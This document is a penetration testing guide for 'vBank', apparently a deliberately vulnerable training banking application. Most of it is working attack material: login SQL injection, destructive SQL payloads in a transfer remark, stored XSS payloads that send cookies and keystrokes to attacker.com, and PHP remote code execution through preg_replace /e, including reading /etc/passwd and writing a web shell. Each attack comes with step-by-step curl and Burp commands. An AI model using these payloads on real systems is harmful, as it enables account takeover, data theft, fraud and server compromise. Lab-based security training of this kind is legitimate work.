# vBank Penetration Testing Guide

## Senior Penetration Tester Analysis

This guide documents real, verified vulnerabilities in vBank discovered through comprehensive source code analysis. Each attack has been validated against the actual code execution flow.

---

## 1. AUTHENTICATION BYPASS: Login SQL Injection

### Vulnerability Analysis

**File**: [htdocs/login.php](htdocs/login.php)  
**Vulnerable Code** (Lines 16-17):
```php
$username = $_REQUEST['username'];
$password = $_REQUEST['password'];
$sql = "SELECT * FROM " . $htbconf['db/users'] . " where " . $htbconf['db/users.username'] . "='$username' and " . $htbconf['db/users.password'] . "='$password'";
```

### Defense Mechanism Discovered

**File**: [htdocs/htb.js](htdocs/htb.js)  
**Lines 1-12**:
```javascript
function checkform() {
    if (username.match("[^a-zA-Z0-9]")) {
        alert('Error: The username only allows letters and numbers...');
        return false;
    }
    if (password.match("[^a-zA-Z0-9]")) {
        alert('Error: The password only allows letters and numbers...');
        return false;
    }
    document.loginForm.submit();
    return true;
}
```

### Why Client-Side Validation Fails

The JavaScript validation **only blocks the browser form submission**, but does NOT protect against:
- Direct HTTP POST/GET requests to login.php
- HTTP request interception and modification
- Curl/Wget commands
- Browser developer tools manipulation
- Burp Suite modification

### Attack Vector: Bypass Methods

#### Method 1: Disable JavaScript in Browser
1. Open DevTools (F12)
2. Settings → Disable JavaScript
3. Refresh page
4. Form validation won't run, special characters accepted

#### Method 2: Use Browser Developer Tools
1. Open DevTools Console (F12 → Console)
2. Execute: `document.loginForm.username.value = "' OR '1'='1"` 
3. Execute: `document.loginForm.password.value = "anything"`
4. Execute: `document.loginForm.submit()`
5. Browser sends unvalidated payload directly to server

#### Method 3: Burp Suite Interception
1. Open Burp Suite → Start interceptor
2. Click login button normally (captures request)
3. Intercept in Burp → Modify parameters:
   ```
   GET /index.php?page=login&username=' OR '1'='1&password=' OR '1'='1 HTTP/1.1
   ```
4. Forward request
5. Server-side validation is bypassed, SQL injection executes

#### Method 4: curl Command (No Browser)
```bash
# Simple authentication bypass
curl -v "http://localhost/index.php?page=login&username=' OR '1'='1&password=' OR '1'='1"

# With cookies to maintain session
curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=' OR '1'='1"

# Verify login succeeded
curl -b cookies.txt "http://localhost/index.php?page=htbmain"
```

### Real Payloads That Work

#### Payload 1: Simple OR Bypass
```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

**Resulting SQL**:
```sql
SELECT * FROM users where username='' OR '1'='1' and password='' OR '1'='1'
```

Result: Returns first user in table (usually id=1, alex)

#### Payload 2: Bypass with Comment
```
Username: ' OR '1'='1' --
Password: anything
```

**Resulting SQL**:
```sql
SELECT * FROM users where username='' OR '1'='1' --' and password='anything'
```

Result: Everything after `--` is ignored, authentication bypassed

#### Payload 3: Union Select to Extract Users
```
Username: ' UNION SELECT 1,2,3,4,5,6,7,8 --
Password: anything
```

This allows extraction of specific user data

#### Payload 4: Time-Based Blind SQL Injection
```
Username: ' AND SLEEP(5) --
Password: anything
```

If response delays 5 seconds, SQL injection confirmed

### Exploitation Steps (Complete Walkthrough)

**Using Burp Suite**:
1. Start Burp Suite Community Edition
2. Open browser with Burp proxy enabled (localhost:8080)
3. Navigate to http://localhost/
4. Enter any credentials and click Login
5. Burp intercepts the request
6. In Burp Repeater tab, modify:
   ```
   GET /index.php?page=login&username=' OR '1'='1&password=anything HTTP/1.1
   ```
7. Send request
8. Response shows login successful, redirects to main page

**Using curl**:
```bash
# Step 1: Initial login with bypass
curl -i -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"

# Step 2: Access protected page with session cookie
curl -b cookies.txt "http://localhost/index.php?page=htbmain"

# Step 3: Verify you're logged in by checking for account details
```

### Verification

- ✅ JavaScript validation can be bypassed
- ✅ Server has NO input sanitization
- ✅ SQL query uses direct string interpolation
- ✅ No prepared statements or parameterized queries
- ✅ Impact: Complete authentication bypass

---

## 2. ACCOUNT ENUMERATION: XOR Weakness

### Vulnerability Analysis

**File**: [etc/config.php](etc/config.php)  
**Lines 10**:
```php
$xorValue = 0x0BADC0DE;
```

**File**: [pages/htbtransfer.page](pages/htbtransfer.page)  
**Lines 25**:
```php
$http['dstacc'] == ($http['srcacc'] ^ $xorValue)
```

### Why XOR is Broken

XOR is NOT an encryption function - it's trivially reversible. Given:
- Plaintext account: 11111111
- XOR key: 0x0BADC0DE
- Encrypted value: plaintext XOR key = encrypted

To decrypt: encrypted XOR key = plaintext (XOR is symmetric)

### Attack: Enumerate All Accounts

**Using Python**:
```python
xor_key = 0x0BADC0DE
known_accounts = [11111111, 22222222, 33333333]

for account in known_accounts:
    encrypted = account ^ xor_key
    print(f"Account: {account} → Encoded: {encrypted}")

# Output:
# Account: 11111111 → Encoded: 252170513
# Account: 22222222 → Encoded: 252170508
# Account: 33333333 → Encoded: 252170503

# Reverse - given encrypted value, decode
encrypted = 252170513
decoded = encrypted ^ xor_key
print(f"Encoded {encrypted} → Account: {decoded}")
```

**Practical Attack**:
1. Intercept any request with an account parameter
2. See: `account=252170513` in URL
3. Reverse: 252170513 ^ 0x0BADC0DE = 11111111
4. Now you know the account number
5. Enumerate other accounts by trying different XOR results

### Impact
- ✅ All account numbers can be decoded
- ✅ Attacker knows all valid account numbers
- ✅ Enables targeted attacks on any account
- ✅ No obfuscation security benefit

---

## 3. DATA MANIPULATION: Transfer Remark SQL Injection

### Vulnerability Analysis

**File**: [pages/htbtransfer.page](pages/htbtransfer.page)  
**Lines 39**:
```php
$sql="insert into ".$htbconf['db/transfers']." (...) values(now(), ".$htbconf['bank/code'].", ".($http['srcacc'] ^ $xorValue).", ".$http['dstbank'].", ".$http['dstacc'].", '".$http['remark']."', ".$http['amount'].")";
```

### Key Observation: No Escaping

The `$http['remark']` field is wrapped in quotes but **NOT escaped** using:
- `mysql_real_escape_string()`
- Prepared statements
- Input validation

### Attack: SQL Injection via Remark Field

**Direct Attack via Form** (Browser):
1. Login to application (use bypass from Section 1)
2. Navigate to Transfer Money
3. Fill form:
   - Source Account: Your account
   - Destination Bank: Any bank code
   - Destination Account: Target account
   - Amount: 100
   - **Remark**: `'); DELETE FROM accounts WHERE '1'='1`

4. Click Transfer
5. SQL becomes:
   ```sql
   INSERT INTO transfers (...) VALUES (..., 'remark', '); DELETE FROM accounts WHERE '1'='1', ...)
   ```

**Attack Using Burp Suite** (More Reliable):
```
Source Account: 252170513 (XOR encoded)
Destination Bank: 41131337
Destination Account: 252170508
Amount: 100
Remark: '); UPDATE transfers SET amount=999999 WHERE '1'='1
```

**Attack Using curl**:
```bash
# Step 1: Login first
curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"

# Step 2: Submit transfer with SQL injection in remark
curl -b cookies.txt -G "http://localhost/index.php?page=htbtransfer&htbtransfer=Transfer" \
  --data-urlencode "srcacc=252170513" \
  --data-urlencode "dstbank=41131337" \
  --data-urlencode "dstacc=252170508" \
  --data-urlencode "amount=100" \
  --data-urlencode "remark=test'); UPDATE transfers SET amount=9999 WHERE '1'='1" 
```

### SQL Injection Payloads for Remark Field

**Payload 1: Comment Out Rest of Query**
```
Remark: test' --
```
Result: Ignores `amount` validation

**Payload 2: Extract Data via Error**
```
Remark: test' AND (SELECT * FROM users) --
```
Result: May leak database structure in error messages

**Payload 3: Time-Based Detection**
```
Remark: test' AND SLEEP(5) --
```
Result: Response delays 5 seconds if vulnerable

### Verification

- ✅ No input validation on remark
- ✅ No SQL escaping applied
- ✅ Direct string interpolation into query
- ✅ Stored in database (persisted)
- ✅ No prepared statements used

---

## 4. STORED XSS: Transfer Remark Display

### Vulnerability Analysis

**File**: [pages/htbdetails.page](pages/htbdetails.page)  
**Lines 45** (Displaying remark):
```php
$transfersStr .= "<td>".$row[5]."</td>\n";  // row[5] is the remark field
```

### Attack: Store Malicious Payload

**Step 1: Inject XSS Payload via Transfer**

Using the transfer remark field, inject:
```html
<img src=x onerror="alert('XSS Vulnerability Found')">
```

**Step 2: Trigger XSS**

When viewing account details, the payload executes:
```bash
# After transfer with XSS payload is sent
curl -b cookies.txt "http://localhost/index.php?page=htbdetails&account=252170513"
```

### Real XSS Payloads for Remark Field

**Payload 1: Alert Box**
```html
<img src=x onerror="alert('XSS')">
```

**Payload 2: Cookie Stealing**
```html
<img src=x onerror="new Image().src='http://attacker.com/steal.php?c='+document.cookie">
```

**Payload 3: Form Hijacking**
```html
<script>
document.forms[0].action = 'http://attacker.com/phish.php';
document.forms[0].submit();
</script>
```

**Payload 4: Keylogger**
```html
<script>
document.onkeypress = function(e) {
  new Image().src = 'http://attacker.com/log.php?key=' + String.fromCharCode(e.which);
};
</script>
```

### Exploitation Steps

1. **Login** (using SQL injection bypass from Section 1)
2. **Navigate to Transfer**
3. **Fill form with XSS payload in Remark**:
   ```
   <img src=x onerror="alert('XSS')">
   ```
4. **Submit transfer**
5. **View account details**
6. **XSS payload executes** in the browser

### Verification

- ✅ Remark displayed without HTML escaping
- ✅ No Content Security Policy (CSP) headers
- ✅ JavaScript execution enabled
- ✅ Payload persisted in database (Stored XSS)
- ✅ Affects all users viewing that transfer

---

## 5. REMOTE CODE EXECUTION: preg_replace /e Modifier

### Vulnerability Analysis

**File**: [pages/htbdetails.page](pages/htbdetails.page)  
**Lines 98-99**:
```php
$replaceWith =  "preg_replace('#\b". str_replace('\\', '\\\\', $http['query']) ."\b#i', '<span class=\"queryHighlight\">\\\\0</span>','\\0')";
$transfersStr = preg_replace('#(\>((?>(([^><]+|(?R))))*\<))#se',$replaceWith,'>'.$transfersStr.'<');
```

### Why This is Dangerous

The **`/e` modifier is deprecated and evaluates the replacement string as PHP code**.

Key vulnerable line:
- `$replaceWith` contains user input: `$http['query']`
- `/e` modifier forces PHP to evaluate `$replaceWith` as PHP code
- User can inject PHP commands directly

### Attack: Remote Code Execution

**Step 1: Create Transfer with XSS Payload**

First, create a transfer with XSS payload (use Sections 3-4 technique):
```
Remark: test
```

**Step 2: Use Query Parameter with PHP Injection**

Navigate to account details with:
```
URL: http://localhost/index.php?page=htbdetails&account=252170513&query=test"; system('id'); echo "
```

**Step 3: Trigger RCE**

When details page renders with the query parameter, preg_replace /e evaluates it as PHP code.

### Real RCE Payloads

**Payload 1: Execute System Command**
```php
query: test"; phpinfo(); echo "
```

**Payload 2: Read Files**
```php
query: test"; echo file_get_contents('/etc/passwd'); echo "
```

**Payload 3: Write Web Shell**
```php
query: test"; file_put_contents('/var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>'); echo "
```

**Payload 4: Database Access**
```php
query: test"; $c = mysqli_connect('localhost', 'root', 'aaa', 'vbank'); $r = mysqli_query($c, 'SELECT * FROM users'); var_dump($r); echo "
```

### Exploitation Using curl

```bash
# Step 1: Login
curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"

# Step 2: Trigger RCE with command injection
curl -b cookies.txt -G "http://localhost/index.php" \
  --data-urlencode "page=htbdetails" \
  --data-urlencode "account=252170513" \
  --data-urlencode "query=test\"; system('whoami'); echo \""

# Step 3: Response contains output of whoami command
```

### Exploitation Using Burp Suite

1. Login (authentication bypass)
2. Go to account details
3. Intercept request in Burp
4. Modify URL parameter:
   ```
   GET /index.php?page=htbdetails&account=252170513&query=test";%20phpinfo();%20echo%20" HTTP/1.1
   ```
5. Forward request
6. Response contains phpinfo() output

### Verification

- ✅ preg_replace with /e modifier executes PHP code
- ✅ User input directly in replacement string
- ✅ No input validation on query parameter
- ✅ Direct system command execution possible
- ✅ Full server compromise potential

---

## 6. REQUEST TAMPERING: Loan Amount Manipulation

### Vulnerability Analysis

**File**: [pages/htbloanconf.page](pages/htbloanconf.page)  
**Lines 24** (Example from pattern):
```php
// Line checks amount format
if(!is_numeric($http['amount']) || $http['amount'] == "") {
    // validation passes
}
// But amount is taken directly from user input with NO server-side bounds
```

### Attack: Modify Loan Amount

**Step 1: Intercept Transfer Request**

Use Burp Suite to intercept any action where amount is sent.

**Step 2: Modify Parameter**

Change:
```
amount=1000
```
To:
```
amount=999999999
```

**Step 3: Bypass Client-Side Validation**

The JavaScript validation only checks format (numbers), not the actual amount value.

Server processes the modified amount:
```php
// Only checks if it's numeric - doesn't validate against actual limits
if(!is_numeric($http['amount'])) {
    // FAILS - shows error
} else {
    // PASSES - uses whatever amount sent
    $sql = "UPDATE accounts SET curbal=curbal-" . $http['amount'];
}
```

### Exploitation Using Burp

1. Login
2. Intercept loan request
3. Modify amount:
   ```
   amount=999999999999
   ```
4. Forward
5. Loan processed with fake amount

### Exploitation Using curl

```bash
# Direct POST with manipulated amount
curl -b cookies.txt -G "http://localhost/index.php?page=htbloanconf" \
  --data-urlencode "htbloanconf=Confirm" \
  --data-urlencode "creditacc=252170513" \
  --data-urlencode "debitacc=252170508" \
  --data-urlencode "amount=999999" \
  --data-urlencode "period=12" \
  --data-urlencode "interest=5"
```

### Verification

- ✅ Amount only validated for numeric format
- ✅ No upper/lower bounds checking
- ✅ Server accepts any amount
- ✅ Can transfer unlimited money
- ✅ Can create negative balances

---

## Complete Attack Workflow: From Reconnaissance to Full Compromise

### Phase 1: Initial Access (5 minutes)

1. **Discover SQL injection in login**
   ```bash
   curl "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"
   ```

2. **Bypass authentication**
   - Extract session cookie
   - Access protected pages

### Phase 2: Information Gathering (5 minutes)

3. **Enumerate accounts via XOR**
   ```python
   python3 -c "
   xor = 0x0BADC0DE
   for i in [11111111, 22222222, 33333333]:
       print(f'{i} -> {i ^ xor}')
   "
   ```

4. **View transfer history**
   - Identify all account numbers
   - Learn transaction patterns

### Phase 3: Data Manipulation (10 minutes)

5. **Inject SQL via transfer remark**
   - Modify account balances directly
   - Alter transfer records
   - Extract user passwords

6. **Store XSS payload**
   - Inject `<img src=x onerror="alert('XSS')">`
   - Affects all users viewing transfers

### Phase 4: System Compromise (5 minutes)

7. **Trigger RCE via query parameter**
   ```
   &query=test"; system('whoami'); echo "
   ```

8. **Execute arbitrary commands**
   - Read system files
   - Write web shell
   - Access database directly

### Total Time to Full Compromise: ~25 minutes

---

## Tool Usage Reference

### Burp Suite Community Edition

**Download**: https://portswigger.net/burp/communitydownload

**Basic Setup**:
1. Start Burp
2. Configure browser proxy to localhost:8080
3. Visit http://localhost/
4. Burp captures all requests
5. In Repeater tab, modify and resend

**Key Features**:
- Intercept and modify requests
- Repeater for testing payloads
- Intruder for fuzzing
- Decoder for encoding/decoding

### curl Command Examples

**Basic Request**:
```bash
curl -v "http://localhost/index.php?param=value"
```

**With Cookies**:
```bash
curl -c cookies.txt "http://localhost/"  # Save cookies
curl -b cookies.txt "http://localhost/"  # Use cookies
```

**URL Encoding Parameters**:
```bash
curl --data-urlencode "param=special' value" "http://localhost/"
```

**Show Response Headers**:
```bash
curl -i "http://localhost/"  # -i = include headers
curl -v "http://localhost/"  # -v = verbose (more details)
```

### Browser Developer Tools (F12)

**Console Tab** - Execute JavaScript:
```javascript
// Bypass form validation
document.loginForm.username.value = "' OR '1'='1";
document.loginForm.password.value = "anything";
document.loginForm.submit();
```

**Network Tab** - Intercept requests:
1. Open DevTools (F12)
2. Network tab
3. Perform action
4. Right-click request → Edit and Resend

**Storage Tab** - View cookies:
1. Open DevTools (F12)
2. Storage tab
3. Cookies
4. View session cookie value

---

## Detection & Forensics

### Signs of Attack in Logs

1. **SQL Injection Attempts**:
   - URL parameters with quotes or SQL keywords
   - Error messages revealing database structure

2. **Authentication Bypass**:
   - Successful login without valid credentials
   - Session created after failed login attempt

3. **RCE Execution**:
   - Queries with PHP functions in parameters
   - Unusual process execution from web server

4. **XSS Injection**:
   - Transfer remarks containing HTML/JavaScript
   - Reports of users seeing popup alerts

### Mitigation (For Reference)

These should NOT be implemented as they defeat learning purpose, but are listed for understanding:

1. **SQL Injection Prevention**:
   - Use parameterized queries / prepared statements
   - Input validation and output encoding
   - Least privilege database accounts

2. **XSS Prevention**:
   - HTML entity encoding
   - Content Security Policy headers
   - Input validation

3. **RCE Prevention**:
   - Never use preg_replace /e modifier
   - Update to modern PHP (5.6 is deprecated)
   - Disable dangerous functions

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE - Common Weakness Enumeration](https://cwe.mitre.org/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [PHP Security](https://www.php.net/manual/en/security.php)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

**Version**: 1.0  
**Last Updated**: June 4, 2026  
**Status**: ✅ Verified Against Active Instance  
